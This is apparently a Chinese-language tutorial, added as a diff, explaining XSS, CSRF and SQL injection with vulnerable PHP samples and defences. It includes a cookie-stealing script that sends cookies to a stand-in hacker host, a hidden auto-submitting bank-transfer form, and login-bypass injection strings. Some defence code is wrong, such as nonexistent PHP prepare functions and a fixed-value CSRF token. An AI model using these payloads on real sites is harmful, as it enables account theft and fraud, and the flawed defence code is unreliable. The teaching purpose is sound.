@@ -1,0 +1,392 @@
+# 1 概述
+web安全，我们探讨一下最常见的三种web安全攻击，xss，csrf与sql注入
+
+# 2 XSS
+跨站脚本漏洞（Cross Site Scripting，常简写作XSS）是Web应用程序在将数据输出到网页的时候存在问题，导致攻击者可以将构造的恶意数据显示在页面的漏洞。因为跨站脚本攻击都是向网页内容中写入一段恶意的脚本或者HTML代码，故跨站脚本漏洞也被叫做HTML注入漏洞（HTML Injection）。 
+
+## 2.1 原理
+
+### 2.1.1 demo
+
+```
+<?php
+echo "欢迎你".$_GET['name']
+?>
+```
+
+这是一段简单的php代码。
+
+![](/assets/img/14594079400736.jpg)
+
+访问后就是这个
+
+![](/assets/img/14594079706284.jpg)
+
+如果我们输入的不是单纯的字符串，而是带有表示下划线的html标签的字符串，那么就会有忧伤的事情。
+
+![](/assets/img/14594080072815.jpg)
+
+更忧伤的是，将带有script标签的字符串传递进去，就会在受害者的浏览器上执行你想运行的script代码。
+
+### 2.1.2 非持久xss
+非持久型XSS（Non-persistent）又叫做反射XSS（Reflect XSS），它是指那些浏览器每次都要在参数中提交恶意数据才能触发的跨站脚本漏洞。像刚才demo演示的就是非持久xss，这种攻击一般就是将攻击代码以url的方式发送给用户，用户点击后就杯具泄漏了自己的个人信息了。
+
+### 2.1.3 持久xss
+持久型XSS（Persistent）又叫做存储XSS（Stored XSS），与非持久型XSS相反，它是指通过提交恶意数据到存储器（比如数据库、文本文件等），Web应用程序输出的时候是从存储器中读出恶意数据输出到页面的一类跨站脚本漏洞。 
+
+下图是某BBS程序没有处理发帖正文中的恶意代码就直接存储到数据库中： 
+
+![](/assets/img/14594083797373.jpg)
+
+然后读帖子的时候程序从数据库中读出数据，结果数据中含有的恶意代码在浏览器执行了（此处仅演示弹出对话框）： 
+
+![](/assets/img/14594084796046.jpg)
+
+## 2.2 攻击
+
+### 2.2.1 盗取cookie
+Cookie是Web程序识别不同的用户的标识，如果得到某人的Cookie，黑客就可以以他的身份登陆网站了，所以跨站脚本攻击的第一个目标就是拿到它。想一想，如果是Web邮箱有一个XSS漏洞，当你查看一封邮件的时候，你的身份标识已经被别人拿到，黑客就可以自由出入你的邮箱了。 
+
+```
+<script> 
+    document.write("<img src=http://www.hacker.com/getcookie.asp?c="+escape(document.cookie)+">"); 
+</script>
+```
+
+这段代码就是输出img标签并访问黑客的Web服务器的一个ASP程序。注意，这里是把当前的Cookie作为参数发送出去了哦（为了避免出现特殊字符，这里使用了escape函数对Cookie进行URL编码）。
+
+### 2.2.2 钓鱼攻击
+钓鱼攻击（Phishing Attack）我想大家都看到过，就是经常在QQ、QQ游戏、空间等地方看到的中奖信息。利用XSS漏洞的钓鱼更加隐蔽且更具欺骗性。因为JavaScript脚本功能强大，我们可以利用它来更改整个页面内容，所以我们就可以制造出利用真的目标域名的假页面： 
+
+```
+<iframe width="100%" height="100%" src="http://hacker"></iframe> 
+```
+
+嵌入这段代码后能覆盖原来的页面，或者在原来的页面插入一个中奖的小窗口
+
+![](/assets/img/14594088929715.jpg)
+
+然后你会发现qq.com上多了一个中奖的窗口，而且域名还是真实的域名，醉了。
+
+### 2.2.3 蠕虫攻击
+我们把那种感染能进行自我复制和传播的病毒叫做蠕虫病毒。当年攻击机器无数、造成巨大破坏的的冲击波、震荡波病毒就是蠕虫病毒。这些传统的蠕虫病毒是依靠远程缓冲区溢出进行传播，在Web2.0时代，蠕虫病毒可以利用跨站脚本漏洞进行传播。最恶心的就是这种病毒，中了后还会自己复制，然后将这个漏洞以几何级数的方式来扩散。
+
+```
+//先插入页面告诉用户自己中奖了
+<iframe width="100%" height="100%" src="http://hacker"></iframe>
+//然后告诉用户的朋友，这里有条信息要告诉你
+<script>
+	$.post('/sendMessage/friend',{text:location.href})
+</script>
+```
+
+真是恶心呀，让用户中枪了以后，还吸引登录用户的朋友过来一起中枪
+
+![](/assets/img/14594093965718.jpg)
+
+百度空间在07年圣诞就遭到过XSS蠕虫的传播。当时百度空间自定义CSS的地方过滤不严导致出现一个持久型XSS漏洞。2007年12月25日晚，有黑客写出了利用这个漏洞进行XSS攻击并自我传播的JavaScript恶意代码。感染该蠕虫的空间将会在空间中存在恶意代码并修改访问该空间的其他百度空间用户的CSS植入XSS攻击代码，还会向好友发送消息诱骗好友来访问中毒的空间。截至26日晚7点百度空间找到原因并修复漏洞，有大于8000个用户空间感染了蠕虫代码。幸好百度空间及时发现蠕虫并修复漏洞，随着时间的增加，被感染的空间将以几何级增长。由此可见，一旦在业务爆发XSS蠕虫将给业务带来巨大的损失。 
+
+## 2.3 防御
+
+### 2.3.1 输出在html页面上
+
+```
+<html>
+	<div>
+		<?php
+			echo "欢迎你".$_GET['name']
+		?>
+	</div>
+</html>
+```
+
+输出在html正文
+
+```
+<html>
+	<div>
+		<?php
+			echo "欢迎你".htmlspecialchars($_GET['name'])
+		?>
+	</div>
+</html>
+```
+
+使用htmlspecialchars转义，将“<”和“>”符号进行转义
+
+### 2.3.2 输出在html页面的属性上
+
+```
+<html>
+	<div style="<?php echo $_GET['name'] ?>">
+	Hello World
+	</div>
+</html>
+```
+
+输出在html属性上
+
+```
+<html>
+	<div style="<?php echo htmlentities($_GET['name']) ?>">
+	Hello World
+	</div>
+</html>
+```
+
+使用htmlentities转义，将双引号"符号进行转义
+
+### 2.3.3 输出在html中的url上
+
+```
+<html>
+	<script src="http://www.baidu.com?a=<?php echo $_GET['name'] ?>"></script>
+</html>
+```
+
+输出在html的url上
+
+```
+<html>
+	<script src="http://www.baidu.com?a=<?php echo urlencode($_GET['name']) ?>"></script>
+</html>
+```
+
+使用urlencode转义，将url的component部分进行转义
+
+### 2.3.4 框架级自动转义
+
+```
+React.createClass({
+	render:function(){
+		return (<div>{this.props.name}</div>);
+	}
+});
+```
+
+由于react嵌入数据的地方都是用{}符号引入动态变量的，所以react会根据嵌入的地方进行恰当的xss转义
+
+```
+<html>
+	<body>
+		<div>{{ .name}}</div>
+	</body>
+</html>
+```
+由于golang是使用{{}}引入动态变量的，所以golang会根据嵌入的地方进行恰当的xss转义
+
+#### 2.3.5 富文本转义
+
+![Screen Shot 2016-03-31 at 9.43.27 P](/assets/img/Screen%20Shot%202016-03-31%20at%209.43.27%20PM.png)
+
+对于富文本数据，你则不能使用react或golang/template框架转义，或者htmlspecialchars来转义，因为直接转义会将所有尖括号转义掉，导致富文本包括图片都不能展示出来。如果不转义，用户有可能输入的是script标签，导致xss攻击。
+
+```
+React.createClass({
+	render: function() {
+		return (<div dangerouslySetInnerHTML={{_html:this.props.content}}></div>);
+	}
+});
+```
+
+所以要注意的是,react设置富文本时需要用dangerouslySetInnerHTML属性，以告诉react，这里面的内容是不能转义的。
+
+```
+//goquery:https://github.com/PuerkitoBio/goquery
+```
+
+那么富文本不能转义的话，就无法做过滤xss攻击了么。答案是使用服务器端的dom来获取输入的富文本，然后分析所有的tag，将所有的script的tag全部过滤掉。一般的话有两种方案，黑名单与白名单，黑名单指定要过滤的html tag，例如script与iframe标签。白名单则指定只能保留哪些的html tag，例如是p与img标签。现在业界比较安全可靠的办法是使用白名单，宁杀错无放过。
+
+# 3 CSRF
+CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账......造成的问题包括：个人隐私泄露以及财产安全。
+
+![](/assets/img/14594325330226.jpg)
+
+## 3.1 原理
+
+### 3.1.2 get请求的csrf攻击
+银行网站A，它以GET请求来完成银行转账的操作，如：http://www.mybank.com/Transfer.php?toBankId=11&money=1000
+危险网站B，它里面有一段HTML的代码如下：
+
+```
+<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>
+```
+
+首先，你登录了银行网站A，然后访问危险网站B，噢，这时你会发现你的银行账户少了1000块......
+利用了jsonp的跨域漏洞
+
+### 3.1.3 post请求的csrf攻击
+银行网站A，它现在改为以POST请求来完成银行转账的操作，
+然后危险网站B也改了，它的代码如下：
+
+```
+<html>
+　　<head>
+　　　　<script type="text/javascript">
+　　　　　　function steal()
+　　　　　　{
+          　　　　 iframe = document.frames["steal"];
+　　     　　      iframe.document.Submit("transfer");
+　　　　　　}
+　　　　</script>
+　　</head>
+
+　　<body onload="steal()">
+　　　　<iframe name="steal" display="none">
+　　　　　　<form method="POST" name="transfer"　action="http://www.myBank.com/Transfer.php">
+　　　　　　　　<input type="hidden" name="toBankId" value="11">
+　　　　　　　　<input type="hidden" name="money" value="1000">
+　　　　　　</form>
+　　　　</iframe>
+　　</body>
+</html>
+```
+
+利用iframe的跨域漏洞
+
+## 3.2 攻击
+
+### 3.2.1 盗用身份
+
+![](/assets/img/14580365338455.jpg)
+
+csrf的攻击是针对cookie的攻击，所以这个攻击是用来盗用用户身份，从而实现跨站发送邮件，发消息，购买商品，虚拟货币转账等等，反正你拿到身份后想怎么玩都行。
+
+## 3.3 防御
+
+### 3.3.1.origin字段
+检查ajax的origin字段
+
+### 3.3.2.csrf令牌
+
+```
+<?php
+　　　//构造加密的Cookie信息
+　　　$value = “DefenseSCRF”;
+　　　setcookie(”cookie”, $value, time()+3600);
+　?>
+```
+
+后端随机生成cookie
+
+```php
+<?php
+　　　　$hash = md5($_COOKIE['cookie']);
+　　?>
+　　<form method=”POST” action=”transfer.php”>
+　　　　<input type=”text” name=”toBankId”>
+　　　　<input type=”text” name=”money”>
+　　　　<input type=”hidden” name=”hash” value=”<?=$hash;?>”>
+　　　　<input type=”submit” name=”submit” value=”Submit”>
+　　</form>
+```
+
+所有的form表单加上cookie的md5编码。
+后台收到请求，校验token与cookie的对应值
+加入ajax的csrf token
+
+### 3.3.3 两步验证
+在一些关键的业务上进行两步验证，例如是发邮件或短信的验证，这样即使cookie被窃取了，在短信未窃取的情况下仍然是可靠的。这种方法一般给用户带来更多繁琐的操作，只会在一些关键的业务上进行。
+
+# 4 sql注入
+
+## 4.1 原理
+
+```
+<?php 
+	$conn = @mysql_connect("localhost",'root','') or die("数据库连接失败！");; 
+	mysql_select_db("injection",$conn) or die("您要选择的数据库不存在"); 
+	$name = $_POST['username']; 
+	$pwd = $_POST['password']; 
+	$sql = "select * from users where username='$name' and password='$pwd'"; 
+	$query = mysql_query($sql); 
+	$arr = mysql_fetch_array($query);
+	if(is_array($arr)){ 
+		header("Location:manager.php"); 
+	}else{ 
+		echo "您的用户名或密码输入有误，<a href=\"Login.php\">请重新登录！</a>"; 
+	} 
+?> 
+```
+
+以上是一段常见的登录验证的sql运行代码
+
+```
+select * from users where username='' or 1=1#' and password=md5('') 
+```
+
+结果用户输入的是username为' or 1=1#,而password是空，结果就进入到了这个系统中了！！！原理很简单，跟xss类似，因为用户输入的sql语句中包含有单引号，使得name的值提前结束，并进行了or操作，很明显or 1 = 1肯定是对的呀！
+
+## 4.2 攻击
+
+### 4.2.1 登录漏洞
+
+```
+' or 1=1#
+```
+
+这是最常见的登录漏洞攻击，对于新手写代码来说，简直一抓一个准。注入后直接无密码登录系统，一个字，爽。
+
+### 4.2.2 拖库
+
+
+![Screen Shot 2016-03-31 at 10.16.13 P](/assets/img/Screen%20Shot%202016-03-31%20at%2010.16.13%20PM.png)
+
+```
+' or select * from t_user#
+```
+
+还记得传说中的csdn拖库造成640万用户资料丢失的事件么，就是因为一个sql注入漏洞，加上密码明文保存，一刹那间用户密码丢失一大堆。再加上用户密码经常是几个账号都用同一个，撞掉一个库，等于撞掉一片库，死伤惨重。
+
+![](/assets/img/14594338966607.jpg)
+
+然后我们总结了中国版的25个弱密码。
+
+## 4.3 防御
+
+### 4.3.1 mysql_real_escape_string转义
+
+```
+<?php 
+	$conn = @mysql_connect("localhost",'root','') or die("数据库连接失败！");; 
+	mysql_select_db("injection",$conn) or die("您要选择的数据库不存在"); 
+	$name = mysql_real_escape_string($_POST['username'],$conn); 
+	$pwd = mysql_real_escape_string($_POST['password'],$conn); 
+	$sql = "select * from users where username='$name' and password='$pwd'"; 
+	$query = mysql_query($sql); 
+	$arr = mysql_fetch_array($query);
+	if(is_array($arr)){ 
+		header("Location:manager.php"); 
+	}else{ 
+		echo "您的用户名或密码输入有误，<a href=\"Login.php\">请重新登录！</a>"; 
+	} 
+?> 
+```
+
+输入的字符串使用mysql_real_escape_string转义
+
+### 4.3.2 sql预处理
+
+```
+<?php 
+	$conn = @mysql_connect("localhost",'root','') or die("数据库连接失败！");; 
+	mysql_select_db("injection",$conn) or die("您要选择的数据库不存在"); 
+	$name = $_POST['username']; 
+	$pwd = $_POST['password']; 
+	$sql = "select * from users where username=? and password= ?"; 
+	$statement = mysql_prepare($sql); 
+	$query = mysql_execute($statement,$name,$pwd); 
+	$arr = mysql_fetch_array($query);
+	if(is_array($arr)){ 
+		header("Location:manager.php"); 
+	}else{ 
+		echo "您的用户名或密码输入有误，<a href=\"Login.php\">请重新登录！</a>"; 
+	} 
+?> 
+```
+
+使用prepare语句的?来代替输入的参数，所以其会自动在输入的参数前后进行转义，避免sql注入攻击。
+
+# 5 总结
+xss,csrf与sql注入是web攻击的三大类型，安全问题要么不发生，要么发生就是大杯具了，大家写程序时还是多留意一点安全意识为重。
+
